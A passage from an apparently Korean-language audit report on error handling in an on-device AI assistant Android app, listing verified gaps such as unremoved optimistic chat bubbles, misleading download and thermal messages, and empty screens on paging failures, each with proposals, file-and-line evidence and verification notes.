- 제안: (1) 입력바에서 보내기 전에 길이를 본다 — Constants.MAX_INPUT_CHARS 를 넘으면 보내지 않고 입력을 그대로 둔 채 안내한다(또는 남은 글자 수를 보여 준다). (2) ChatViewModel.sendMessage 의 결과가 AppResult.Failure(=턴이 시작되지 않음)이거나 사용자 메시지 저장 실패이면 이미지 읽기 실패 분기처럼 낙관적 말풍선을 걷어낸다. (3) 가능하면 실패 시 입력란에 원문을 되돌려 준다(ViewModel 이 '되돌릴 글' 상태를 한 번 내보내는 방식 — ChatScreen 기본 인자 계약은 유지).
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatInputBar.kt:255-258 — 보내기를 누르면 결과와 상관없이 입력란을 즉시 비운다(길이 제한·글자 수 표시 없음)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:455-473 — 검증 전에 낙관적 사용자 말풍선을 먼저 붙인다
  - domain/src/main/java/com/kosmos/app/domain/usecase/SendChatMessageUseCase.kt:63-66 — 길이 초과는 저장 전에 ValidationError(TOO_LONG) 로 반환
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:631-633 — Failure 분기는 error 만 세팅하고 낙관적 말풍선을 걷지 않는다(이미지 읽기 실패 분기 488-496 은 걷어낸다)
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:254 — 안내는 "입력이 너무 길어요. 조금 줄여서 다시 보내 주세요."
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:108-111 — 사용자 메시지 DB 저장 실패도 같은 모양(말풍선은 남고 DB 에는 없음)
- 검증: ChatInputBar.kt:255-258 — onSend 뒤 바로 textState 를 비운다. 보내기 경로는 이 한 곳뿐이고 입력란에 길이 제한 코드는 없다(MAX_INPUT_CHARS 를 쓰는 곳은 SendChatMessageUseCase·TranscribeAudioUseCase 뿐, grep 확인). ChatViewModel.kt:456-473 — 검증 전에 낙관적 말풍선을 붙인다. SendChatMessageUseCase.kt:64-66 — 8,192자(Constants.kt:211) 초과면 저장 전에 Failure(TOO_LONG). ChatViewModel.kt:632-634 — Failure 분기는 error 만 세팅하고 말풍선을 걷지 않는다(이미지 읽기 실패 489-496 은 걷는다). 문구는 ErrorMessages.kt:30(증거의 254줄은 틀림). AssistantOrchestrator.kt:108-111, 124-126 의 저장 실패도 AgentResult.Error 만 돌려줘 같은 모양(ChatViewModel.kt:627-629). 재현 경로가 코드로 닫힌다. CHANGELOG·plans 에서 관련 기록 못 찾음.

### gap-errors-3 · 답 생성이 실패한 턴: 오류 말풍선은 DB 에만 저장되고 화면에는 잠깐 뜨는 스낵바뿐, 다시 보내기도 없다
- 판정 확인됨 · 중요도 중간 · 크기 M · 모델 입력
- 왜: 휴대폰 안 모델은 시간 초과·빈 답·발열 차단이 실제로 난다. 그때 사용자는 자기 말풍선 아래 아무것도 없는 화면과 몇 초짜리 스낵바만 보고, 놓치면 왜 답이 없는지 알 수 없다. 반면 앱을 다시 열면 같은 자리에 오류 말풍선이 나타나 화면과 기록이 서로 다르다(음성 턴은 또 다르게 동작). 또 그 오류 문구는 표시가 없는 일반 비서 메시지라 다음 턴의 대화 기록·대화 요약·사실 추출에 그대로 들어갈 수 있다(이 부분은 걸러내는 코드를 찾지 못한 것이지 전 경로를 확인한 것은 아니다).
- 제안: (1) AgentResult.Error 일 때도 저장된 것과 같은 문구의 말풍선을 화면 목록에 붙여(또는 loadMessages 로 DB 와 맞춰) 화면과 기록을 일치시킨다. (2) 오류 말풍선에 '다시 보내기'를 단다 — 직전 사용자 메시지 내용으로 sendMessage 를 다시 부르되, 이미 저장된 사용자 메시지가 두 번 쌓이지 않게 처리 방식을 정한다. (3) 오류 말풍선을 구분할 표시(예: 메시지 종류 칸)를 두어 대화 기록 조립·요약에서 뺄지 결정한다 — 이 부분은 모델 입력(대화 기록)이 달라지므로 회귀 세트 확인이 먼저다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantMessageWriter.kt:69-79 — saveError 가 오류 문구를 ASSISTANT 말풍선으로 DB 에 저장
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:627-629 — AgentResult.Error 는 uiState.error 만 세팅(메시지 목록에 붙이지 않음)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:539 — DB 재동기화(loadMessages)는 음성 턴에서만 호출 → 글자 턴은 오류 말풍선이 화면에 안 나오고, 음성 턴은 나온다
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:323-328 — 표시 수단은 동작 버튼 없는 스낵바 한 번
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:267-268 — 문구는 "다시 시도해 주세요"인데 다시 보내는 버튼이 없고 입력란은 비워져 있다(ChatInputBar.kt:257)
  - app/src/main/java/com/kosmos/app/assistant/context/ContextBuilder.kt — 오류 말풍선을 걸러내는 코드가 보이지 않음(일반 ASSISTANT 메시지와 구분 표시 없음)
- 검증: AssistantMessageWriter.kt:69-79 — saveError 가 오류 문구를 일반 ASSISTANT 말풍선으로 DB 에 저장(호출처 BaseAgent.kt:153·177, AssistantOrchestrator.kt:134). ChatViewModel.kt:627-629 — AgentResult.Error 는 error 만 세팅, 목록에 붙이지 않음. loadMessages() 호출은 200·293·539줄뿐이고 539 는 음성 턴 전용 → 글자 턴은 그 세션 화면에 오류 말풍선이 없고 다시 열면 생긴다. ChatScreen.kt:324-328 — 동작 버튼 없는 스낵바 한 번. 대화 기록 쪽: ContextBuilder.kt:148-153 은 거절 턴(RefusalTurns)과 같은 질문의 앞 답(RepeatedQuestions)만 걸러낸다. RefusalTurns 의 판정식(기능이 없/드릴 수 없 등)은 '답을 만들지 못했어요. 다시 시도해 주세요'에 맞지 않으므로 오류 말풍선은 다음 턴 모델 입력에 실린다(같은 질문을 다시 보내면 RepeatedQuestions 가 앞 답을 뺄 수는 있다). 요약·사실 추출 경로는 직접 확인하지 않았다. 제안 (3)은 모델 입력이 바뀌므로 회귀 세트가 먼저라는 표시가 맞다. 증거의 ErrorMessages 줄 번호는 43-44줄이 맞다.
- 앞선 기록: CHANGELOG 0.40.2(564줄, 오류 말풍선 언어 반영), 0.38.6(683줄, 실패 턴 뒤 대화를 DB 기록으로 다시 만듦). BaseAgent.kt:172-175 주석은 '말풍선도 남긴다 — 화면에 흔적이 없으면 앱이 죽었다고 오해한다'는 의도를 적고 있어 화면 미표시는 의도와 어긋난다

### gap-errors-4 · 모델 내려받기가 주소 오류·접근 거부·크기 불일치로 실패해도 "네트워크에 연결할 수 없어요"로 나온다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 주소가 틀렸거나(404), 접근 권한이 필요한 저장소이거나(401·403), 서버 파일이 바뀌어 크기가 안 맞는 경우는 몇 번을 다시 눌러도 같은 결과다. 그런데 화면은 와이파이를 확인하라고 하고 '다시 시도'를 권한다. 새 휴대폰에 앱을 깔거나 모델 주소를 바꿀 때 바로 걸리는 자리이고, 코드에는 이미 '재시도 가능/불가능' 구분이 있는데 마지막 화면 문구에서 그 구분이 사라진다.
- 제안: 오류 코드를 하나 더 둔다(예: MODEL_DOWNLOAD_REJECTED — "이 주소에서 모델을 받을 수 없어요. 주소나 접근 권한을 확인해 주세요", 크기 불일치는 "받은 파일이 올바르지 않아 지웠어요. 다시 받아 주세요"). Worker 의 Permanent 분기와 Data.toAppError() 가 이 코드를 쓰게 하고, 실패 대화상자는 이 경우 '다시 시도' 대신 주소 확인을 앞세운다. ErrorMessageMappingTest 가 전수 순회라 새 코드의 문구 누락은 컴파일·테스트가 잡는다.
- 근거:
  - app/src/main/java/com/kosmos/app/work/ModelDownloadWorker.kt:108-110 — 재시도해도 소용없는 실패(Permanent)를 AppError.NetworkUnavailable 로 바꾼다
  - data/src/main/java/com/kosmos/app/data/network/ModelDownloadService.kt:261-265, 305-311 — Permanent 는 HTTP 4xx(401·403·404)와 받은 파일 크기 불일치
  - app/src/main/java/com/kosmos/app/work/WorkManagerModelDownloadScheduler.kt:214-224 — 복원할 때도 저장 공간·주소 누락 외에는 전부 NetworkUnavailable
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:273 — 문구 "네트워크에 연결할 수 없어요. 연결 상태를 확인해 주세요."
  - app/src/main/java/com/kosmos/app/feature/settings/ModelManagementScreen.kt:175-195 — 실패 대화상자는 이 문구 + '다시 시도' 버튼(같은 주소로 다시 받음)
- 검증: ModelDownloadWorker.kt:108-110 — Permanent 를 NetworkUnavailable 로 바꾼다. ModelDownloadService.kt:261-264(크기 불일치), 306-311(5xx·408·429 외 HTTP 오류)이 Permanent. WorkManagerModelDownloadScheduler.kt:214-224 — 저장 공간·주소 누락 외 전부 NetworkUnavailable. 문구는 ErrorMessages.kt:49(증거의 273줄은 틀림). ModelManagementScreen.kt:175-195 — 문구 + '다시 시도'(같은 주소). 주소 입력란이 실제로 있다(ModelManagementScreen.kt:121 OutlinedTextField, 기본값은 Constants.kt:232) — 사용자가 주소를 바꿀 수 있으므로 404·401·403 은 현실적인 경로다. 기본 주소를 그대로 쓰면 드물다.
- 앞선 기록: architecture.md 1297-1298줄(Transient/Permanent/InsufficientStorage 분류, 실패 사유는 ErrorCode 이름으로 전달), CHANGELOG 1489-1500줄 부근. Permanent 를 네트워크 문구로 내기로 했다는 결정 기록은 없음

### gap-errors-5 · 채팅 첨부 실패가 원인과 상관없이 전부 "지원하지 않는 파일 형식이에요"로 나온다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 암호 걸린 PDF, 너무 큰 엑셀, 스캔본 PDF 를 채팅에 붙이면 '형식을 지원하지 않는다'고만 나온다. PDF·엑셀은 지원한다고 안내하는 앱이라 사용자는 고장으로 받아들인다. 같은 파일을 문서 화면에서 열면 '암호가 걸린 문서', '파일이 너무 커요'처럼 정확히 나오므로 화면끼리 말이 다르다. 오류 종류 이름(UnsupportedImageFormat)이 문서·권한 실패까지 떠안고 있어 코드를 읽는 사람도 헷갈린다.
- 제안: ShareIntentHandler.offerDocumentFile 의 실패를 AppError 로 뭉개지 말고 DocumentError 를 그대로 화면까지 전달한다(공유 입력 흐름의 실패 쪽에 문서 오류를 담을 수 있는 종류를 추가하거나 AppError 에 문서 실패 종류를 하나 두고 DocumentError 를 싣는다). ChatScreen 은 documentErrorMessage() 를 재사용한다. 이미지 쪽은 '읽지 못함(권한·파일 없음)'과 '형식 미지원'을 나눈다. 글자 없는 문서는 보관함의 "글자를 읽을 수 없는 문서예요" 문구를 쓴다.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/share/ShareIntentHandler.kt:80-81 — 문서 추출 실패(암호·너무 큼·손상·읽기 권한 없음·글자 없는 스캔 PDF)를 모두 UnsupportedImageFormat("문서 첨부 실패: …") 로 바꾼다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerScreen.kt:311-317 — 같은 실패 종류(DocumentError 5가지)에 대한 구체 문구가 이미 있고 문서 보기 화면은 그것을 쓴다
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:426 — 이미지 읽기 실패(권한 만료·파일 없음)도 UnsupportedImageFormat
  - app/src/main/java/com/kosmos/app/runtime/gemma/ImageInputAdapter.kt:79, 96, 109, 112 — 이미지 디코딩·전처리 실패도 같은 종류
  - app/src/main/java/com/kosmos/app/platform/share/ShareIntentHandler.kt:149-153 — 공유 이미지 조회 예외(권한 등)도 같은 종류
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:258 — 문구는 "지원하지 않는 파일 형식이에요." 한 가지
- 검증: ShareIntentHandler.kt:80-81 — DocumentResult.Fail 을 종류와 무관하게 UnsupportedImageFormat("문서 첨부 실패: …") 로 바꾼다. ChatViewModel.kt:378-380 이 그 오류를 그대로 올리고 ChatScreen.kt:324-327 이 ErrorMessages.kt:34 '지원하지 않는 파일 형식이에요.' 한 문구로 보인다(증거의 258줄은 틀림). 문서 화면에는 종류별 문구가 있다(DocumentViewerScreen.kt:311-317, strings.xml:378-382). 이미지 쪽도 ChatViewModel.kt:426(읽기 실패), ShareIntentHandler.kt:149-153(조회 예외), ImageInputAdapter.kt:79·96·109·112 가 같은 종류. '글자 없는 스캔 PDF'가 채팅 첨부에서 어떤 결과로 떨어지는지는 DocumentTextExtractor 를 끝까지 읽지 않아 확인하지 못했다 — 그 한 예시만 미확인.
- 앞선 기록: CHANGELOG 0.35.0(입력바 문서 첨부 도입). ShareIntentHandler.kt:68 주석 '실패는 지원하지 않는 파일 형식 안내로' — 당시 단순화이고 사용자 결정으로 기록된 것은 아님

### gap-errors-6 · 발열 안내가 실제 동작과 다르고(차단인데 "속도를 줄였어요"), 식은 뒤에도 배너가 남는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 여름·충전 중 사용에서 실제로 만나는 상황이다. 같은 순간에 배너는 '느려졌다', 스낵바는 '중단했다'고 말하고, 실제로는 답이 아예 안 온다. 언제 다시 되는지 안내가 없고, 기기가 식어도 배너는 사용자가 다시 보내 볼 때까지 '뜨겁다'고 남아 있어 사용자가 계속 기다리게 된다.
- 제안: (1) 임계 배너 문구를 실제 동작에 맞춘다("기기가 뜨거워 잠시 답을 멈췄어요. 식으면 다시 보내 주세요") — 한·영 둘 다. (2) 경고 상태를 추론 경계에서만이 아니라 채팅 화면이 떠 있는 동안 주기적으로(이미 있는 refreshDeviceStatus 주기에 묶어) 다시 판정해, 식으면 배너가 내려가게 한다. 판정은 now·온도를 인자로 받는 순수 함수로 두어 테스트한다. (3) 화면에 안 나오는 ErrorMessages 의 TEMPERATURE_WARNING 문구는 strings.xml 쪽과 하나로 맞추거나 주석으로 쓰임새를 밝힌다.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/metrics/RuntimeMetricsCollector.kt:74-86 — 임계 온도 이상이면 추론을 시작하지 않고 Failure(TemperatureCritical) 로 막는다(주석: '하드 차단')
  - app/src/main/res/values/strings.xml:146 — 배너 문구 chat_thermal_critical = "기기가 뜨거워 보호하려고 속도를 줄였어요." (values-en/strings.xml:143 도 'Slowing down')
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:286 — 같은 상황의 스낵바·말풍선 문구는 "발열이 심해 기기 보호를 위해 잠시 중단했어요."
  - app/src/main/java/com/kosmos/app/runtime/metrics/RuntimeMetricsCollector.kt:74-90, 135-156 — 경고 상태(_thermalWarning)는 추론 직전·직후에만 갱신된다. 차단된 뒤에는 추론이 없으니 다음에 보낼 때까지 값이 그대로
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:358-368 — 배너는 그 상태를 그대로 보여 준다
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:285 vs strings.xml:147 — 경고 문구가 두 곳에 서로 다르게 있다(ErrorMessages 쪽은 TemperatureWarning 이 Failure 로 반환되는 곳이 없어 화면에 나오지 않음)
- 검증: RuntimeMetricsCollector.kt:75-92 — 임계 온도 이상이면 Failure(TemperatureCritical) 로 추론을 시작하지 않는다. strings.xml:146 배너 문구는 '속도를 줄였어요', 같은 상황의 ErrorMessages.kt:62 는 '잠시 중단했어요'(증거의 286줄은 틀림) — 서로 다르고 배너가 실제 동작과 어긋난다. _thermalWarning 을 쓰는 곳은 checkPreconditions(81·87·89)와 recordEnd(146·152·154)뿐이고(grep), 부르는 곳은 GemmaModelRunner.kt:272·443·341·375·385 — 전부 추론 경계다. 화면이 떠 있는 동안 도는 refreshDeviceStatus(61-69, ChatViewModel.kt:311-319)는 온도 숫자만 갱신하고 경고 상태는 건드리지 않는다. 따라서 차단 뒤 식어도 다음 추론 시도까지 배너가 남는다(443줄의 채팅 밖 추론이 돌면 갱신될 수는 있다). ErrorMessages.kt:61 의 경고 문구는 TemperatureWarning 을 Failure 로 돌려주는 곳이 없어 화면에 나오지 않는다(grep: 생성처는 수집기 두 곳뿐). 상단 상태에 온도 숫자가 따로 보이기는 한다. 영어 리소스 문구는 직접 열어 보지 않았다.
- 앞선 기록: RuntimeMetricsCollector.kt:82-84 주석(임계는 차단이 맞다고 바로잡음). CHANGELOG 에서 chat_thermal_critical 문구나 배너 갱신 주기에 대한 기록은 찾지 못함

### gap-errors-7 · 위키 검색: '문서 없음'도 네트워크 오류로 분류되고, 내부 오류 이름이 모델 입력에 그대로 들어간다
- 판정 확인됨 · 중요도 중간 · 크기 M · 모델 입력
- 왜: 비행기 모드와 '그런 문서가 없음'은 사용자가 할 일이 전혀 다른데 둘 다 '웹 검색 보강 실패'로만 보인다. 모델은 "NetworkUnavailable(reason=No Wikipedia articles found…)" 같은 영어 내부 문자열을 받아 답에 그대로 옮기거나(내부 이름 노출) 네트워크 문제라고 잘못 설명할 수 있다. 기억 저장 툴에서는 같은 이유로 내부 이름을 뺐는데 검색 두 툴에는 남아 있어 일관성 질문을 받기 쉽다.
- 제안: (1) 위키 구현에서 '결과 없음'은 실패가 아니라 성공(빈 결과) 또는 전용 종류로 돌려 searchFailed 안내가 뜨지 않게 하고, 진짜 연결 실패만 NetworkUnavailable 로 둔다. 쓰이지 않는 SearchError 를 이 용도로 살리거나 지운다. (2) 두 검색 툴의 실패 결과 문구에서 toString 을 빼고 AddMemory 처럼 행동을 적은 고정 문장으로 바꾼다(진단 원문은 감사 기록으로). 툴 결과 문구는 모델 입력이므로 토큰 실측과 회귀 세트 확인이 먼저다(AGENTS §2-⑤).
- 근거:
  - data/src/main/java/com/kosmos/app/data/tool/WikipediaSearchToolImpl.kt:86-88, 105-107 — 검색 결과 없음·본문 없음을 AppError.NetworkUnavailable 로 반환(HTTP 오류·예외 80, 128줄과 같은 종류)
  - app/src/main/java/com/kosmos/app/assistant/tool/SearchWikipediaToolExecutor.kt:56-58 — 툴 결과에 "검색 중 오류 발생: ${res.error}" — data class toString 이라 "NetworkUnavailable(reason=…)" 가 모델에 전달된다
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:256-263 — 실패면 searchFailed → 화면에 "웹 검색 보강에 실패해 기기 안의 정보만으로 답했어요"(strings.xml:104)
  - app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:134-140, 163, 399-400 — 기억 검색 실패도 error.toString()(예: DbReadError(table=…))을 모델에 보낸다
  - app/src/main/java/com/kosmos/app/assistant/tool/AddMemoryToolExecutor.kt:60-63 — 같은 저장소에서 '내부 오류 이름은 모델 입력에서 뺐다'고 이미 결정한 전례(exp38)
  - core/src/main/java/com/kosmos/app/core/common/AppError.kt:40 — SearchError 는 정의·문구(SEARCH_TIMEOUT)만 있고 만드는 곳이 0곳(grep 확인)
- 검증: WikipediaSearchToolImpl.kt:86-88(결과 없음), 105-107(본문 없음)이 80·128줄(HTTP 오류·예외)과 같은 NetworkUnavailable. SearchWikipediaToolExecutor.kt:56-58 — "검색 중 오류 발생: ${res.error}" 로 data class 문자열이 툴 결과(모델 입력)에 들어간다. BaseAgent.kt:256-263 — 실패면 searchFailed, ChatViewModel.kt:618 이 안내를 띄운다. SearchMemoryToolExecutor.kt:134·136·138·140·163 이 error.toString() 을 400줄 errorJson 으로 모델에 보낸다. SearchError 는 본 코드에서 생성처 0곳(테스트 2곳만: ErrorMessageMappingTest.kt:66, MemoryPipelineIntegrationTest.kt:111). 제안 (2)는 툴 결과 문구를 바꾸므로 토큰 실측·회귀 세트가 선행돼야 한다는 표시가 맞다. 제안 (1)에서 '결과 없음'을 성공으로 돌리면 그 문구도 모델 입력이 되므로 역시 실측 대상이다. 모델이 내부 문자열을 답에 옮긴다는 것은 가능성이지 관측 기록은 아니다.
- 앞선 기록: DbCall.kt:11-14 주석·CHANGELOG 964줄 부근(지식 DB 오류의 SearchError 오분류 교정), AddMemoryToolExecutor.kt:60-63 주석(exp38 — 내부 오류 이름을 모델 입력에서 뺌). 위키 결과 없음·검색 툴 실패 문구에 대한 결정 기록은 찾지 못함

### gap-errors-8 · 목록 화면 5곳이 불러오기 실패를 표시하지 않아 빈 화면으로 보인다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: DB 읽기가 실패하면(복원 직후 어긋남, 저장 공간·파일 문제) 기억·할 일·지난 대화·활동 기록이 안내도 빈 상태 문구도 없이 그냥 비어 보인다. 사용자는 데이터가 지워졌다고 받아들인다 — 개인 비서 앱에서 가장 불안한 실패 모양이다. 같은 문제를 라이브 대화에서는 이미 고쳤는데 페이징 쪽은 남아 있다.
- 제안: 공용 컴포저블 하나(예: PagingErrorRow)를 만들어 loadState.refresh / append 가 Error 일 때 "데이터를 불러오지 못했어요" + '다시 시도'(items.retry())를 보이게 하고 다섯 목록에 붙인다. unwrapForPaging 은 error.toString() 대신 AppError 를 담는 전용 예외를 던져 화면이 ErrorMessages 로 문구를 고르게 한다. 서랍 검색은 실패를 null/오류 상태로 구분해 '결과 없음'과 다른 문구를 낸다.
- 근거:
  - app/src/main/java/com/kosmos/app/ui/paging/DefaultPagingSource.kt:50-53 — 저장소 실패를 IllegalStateException(error.toString()) 으로 던져 페이징의 오류 상태로 만든다
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:457, app/src/main/java/com/kosmos/app/feature/memory/MemoryScreen.kt:260, 379 — 화면은 '불러오기 끝 + 0건'일 때만 빈 상태 문구를 보이고, 오류 상태(LoadState.Error)를 다루는 코드는 앱 전체에 0곳(grep 확인)
  - 사용처: ChatViewModel.kt:135-138(지난 대화), DrawerViewModel.kt:63(대화 묶음 서랍), MemoryViewModel.kt:74-88(기억·할 일·완료), AuditViewModel(활동 기록)
  - app/src/main/java/com/kosmos/app/feature/drawer/DrawerViewModel.kt:98-104 — 서랍 검색도 실패를 빈 목록으로 바꿔 '결과 없음'과 구분되지 않는다
  - 대조: ChatViewModel.kt:411-414 — 라이브 대화 읽기 실패는 '빈 화면으로 열리던 문제'를 고쳐 스낵바를 띄우게 한 전례가 있다
- 검증: DefaultPagingSource.kt:50-53 — Failure 를 IllegalStateException(error.toString()) 으로 던지고 36-40줄에서 LoadResult.Error 가 된다. 앱 전체에서 페이징 loadState 를 읽는 곳은 ChatScreen.kt:457, MemoryScreen.kt:260·379 세 곳뿐이고 전부 'NotLoading + 0건'만 본다 — LoadState.Error·retry() 사용처 0곳(grep). 따라서 첫 불러오기가 실패하면 빈 상태 문구조차 안 나오는 빈 화면이 된다. DrawerViewModel.kt:98-104 — 검색 실패를 as? Success … orEmpty() 로 빈 목록으로 만든다. 다만 DB 읽기 실패 자체가 드문 상황이라 실사용에서 만날 빈도는 낮다 — 심각도는 중간 유지하되 우선순위는 높지 않다. AuditViewModel 사용처는 직접 열어 보지 않았다(loadState 처리 0곳이라는 grep 결과로 충분).
- 앞선 기록: ChatViewModel.kt:412-414 주석(전량 로드 시절 '안내 없는 빈 화면'을 고친 전례). 페이징 목록의 오류 상태에 대한 기록은 찾지 못함

### gap-errors-9 · 문구는 '설정에서 허용', '모델 관리에서 내려받기'를 말하는데 그리로 가는 버튼이 없거나 문구 자체가 화면에 도달하지 않는다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
- 왜: 문구가 다음 행동을 알려 주더라도 사용자가 직접 설정 메뉴를 찾아 들어가야 하면 절반만 한 것이다. 특히 캘린더는 권한을 거부하면 앱 안에만 저장되는데 카드와 답은 '기기 캘린더에도 추가'라고 말해, 캘린더 앱에서 일정이 안 보일 때 원인을 알 길이 없다. 녹음을 시작도 못 했는데 '다시 말씀해 주세요'라고 하는 것도 원인과 다른 문구다.
- 제안: (1) 일정 추가 결과에 '기기 캘린더 반영 여부'를 실어(AddScheduleUseCase 가 성공 값에 동기화 결과를 함께 반환) 결과 카드나 스낵바로 "기기 캘린더에는 넣지 못했어요" + 권한 설정 버튼을 보인다 — 툴 결과 문구(모델 입력)는 건드리지 않고 화면 쪽에서만 알리면 실측 없이 가능하다. (2) 마이크 권한 스낵바에 '설정 열기' 동작을 단다(캘린더 화면의 설정 이동 코드 재사용). (3) 채팅 상태 시트에 시작 화면과 같은 '모델 내려받기' 버튼을 조건부로 추가한다. (4) 녹음 시작 실패는 전사 실패와 다른 문구("마이크를 쓸 수 없어요")로 나눈다.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/usecase/AddScheduleUseCase.kt:57-69 — 기기 캘린더 쓰기 실패(권한 거부 포함)는 로그만 남김 → ErrorMessages.kt:260, 270 의 캘린더 권한·접근 실패 문구는 일정 추가 경로에서 화면에 나올 길이 없다
  - app/src/main/res/values/strings.xml:190 — 승인 카드는 "앱 일정과 기기 캘린더에 함께 추가돼요"라고 약속하고, 툴 결과는 "일정이 성공적으로 추가되었습니다"(AddScheduleToolExecutor.kt:68)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:229, 268-276 — 마이크 권한 거부 안내("설정에서 권한을 허용해 주세요")는 동작 버튼 없는 스낵바. 영구 거부 뒤에는 시스템 창도 다시 뜨지 않는다
  - app/src/main/java/com/kosmos/app/feature/calendar/CalendarScreen.kt:97 — 캘린더 화면에는 앱 설정으로 가는 버튼이 이미 있다(재사용 가능)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatHeader.kt:203-216 — 채팅 상태 시트는 '모델 없음/손상'일 때 '다시 시도'만 있다. 문구는 "설정 > 모델 관리에서 내려받아 주세요"(ErrorMessages.kt:264, 266). 시작 화면(SplashScreen.kt:109-115)에는 내려받기 버튼이 있다
  - app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:67-68, 78-92 — 녹음 시작 실패(권한 없음·마이크 사용 중)도 SttError → "음성을 인식하지 못했어요. 다시 말씀해 주세요"
- 검증: 캘린더 부분은 이미 결정된 설계다: AddScheduleUseCase.kt:55-69 가 ADR-004 를 근거로 동기화 실패를 로그로만 남기고, 승인 카드가 뜰 때 권한을 요청한다(ChatScreen.kt:305-313). 사용자도 '무관'으로 판단한 기록이 있다(CHANGELOG 1154). 다만 승인 카드 문구(strings.xml:190 '기기 캘린더에 함께 추가돼요')와 실제가 어긋날 수 있다는 지적 자체는 사실이고, 제안이 저장 정책을 뒤집는 것이 아니라 화면 안내를 더하는 것이라 결정과 충돌하지는 않는다. 나머지 세 가지는 코드로 확인됨: 마이크 권한 거부는 동작 버튼 없는 스낵바(ChatScreen.kt:229, 268-275), 설정 이동 코드는 CalendarScreen.kt:94-101 에 이미 있다. 채팅 상태 시트는 '다시 시도'만 있고(ChatHeader.kt:203-215) 시작 화면에는 내려받기 버튼이 있다(SplashScreen.kt:109-115). 녹음 시작 실패가 전부 SttError(AudioRecorder.kt:68·79·91·104) → ErrorMessages.kt:47 '다시 말씀해 주세요'. 문구 줄 번호는 36·40·42·46·47줄이 맞다(증거의 260·264·266·270줄은 틀림).
- 앞선 기록: architecture.md 1278줄 ADR-004(기기 캘린더는 로컬 DB 우선 + 최선 노력 동기화, 실패는 조용히 로컬 저장 유지), CHANGELOG 1154줄(실기기에서 캘린더 미반영 관측 — 사용자 판단 '무관', 동기화 실패는 설계상 조용히 유지), ChatScreen.kt:286-287 주석

### gap-errors-10 · 오류 종류 정리: 쓰이지 않는 종류·버려지는 사유 문장·한 칸의 두 가지 용도·리소스 밖 문구
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
- 왜: 당장 사용자가 다치는 결함은 아니지만, '오류를 종류로 나눠 한 곳에서 문구를 고른다'는 구조를 면접에서 설명할 때 약점이 되는 자리들이다: 정의만 있고 안 쓰는 종류, 만들어 놓고 버리는 사유 문장, 한 칸(reason)에 기계 토큰과 사용자 문장이 섞인 것, AGENTS §3-②(숫자 베끼지 않기)·§4-7(문구는 리소스)과 어긋나는 것. 엔진 로드 실패를 전부 '파일 손상'으로 안내하는 것은 메모리 부족일 때 불필요한 재다운로드를 부를 수 있다(이 항목은 실패 원인별 재현을 확인하지 못한 추정).
- 제안: (1) SearchError·PERMISSION_DENIED_STORAGE 는 gap-errors-7 의 용도로 살리거나 지운다. (2) ValidationError 를 '기계 토큰용'과 '사용자 문장을 담는 종류'(예: UserMessage(text))로 나눠 화면이 reason 을 직접 꺼내 쓰는 세 곳을 정리한다. (3) 툴 반복 상한은 전용 코드로 올려 "요청이 복잡해 끝내지 못했어요. 나눠서 말해 주세요"처럼 다음 행동이 다른 문구를 준다. (4) 50MB 는 Constants.MAX_IMAGE_SIZE_BYTES 에서 계산해 넣는다. (5) 엔진 로드 실패 문구는 '다시 시도'를 먼저 권하고 반복되면 재다운로드를 안내하도록 순서를 바꾼다(시작 화면 버튼 순서 포함). ErrorMessages 를 리소스로 옮기는 것은 core 모듈에 Context 가 없어 비용이 크므로, 지금은 KDoc 에 '리소스 밖에 두는 이유'를 적는 정도로 충분하다.
- 근거:
  - core/src/main/java/com/kosmos/app/core/common/AppError.kt:40 — SearchError 생성처 0곳. ErrorCodeMapper.kt:196 의 PERMISSION_DENIED_STORAGE 도 캘린더·마이크 외 PermissionDenied 를 만드는 곳이 없어 도달 불가(grep 확인)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:177-185 — 툴 반복 상한 초과에 한·영 사유 문장을 따로 만들지만 ErrorMessages 는 코드만 보고 "답을 만들지 못했어요. 다시 시도해 주세요"를 낸다(사유 문장은 어디에도 표시되지 않음, 같은 입력으로 다시 해도 같은 결과일 수 있음)
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:394, 404 — 출력 상한 도달·빈 답도 같은 일반 문구로 합쳐진다
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:266, feature/calendar/CalendarViewModel.kt:152, feature/chat/result/ChatExtrasViewModel.kt:222 — ValidationError.reason 을 그대로 화면에 보인다. 같은 칸이 다른 곳에서는 기계용 토큰("blank"·"too_long", ValidationReason.kt:16-17)이라 섞이면 토큰이 화면에 나온다
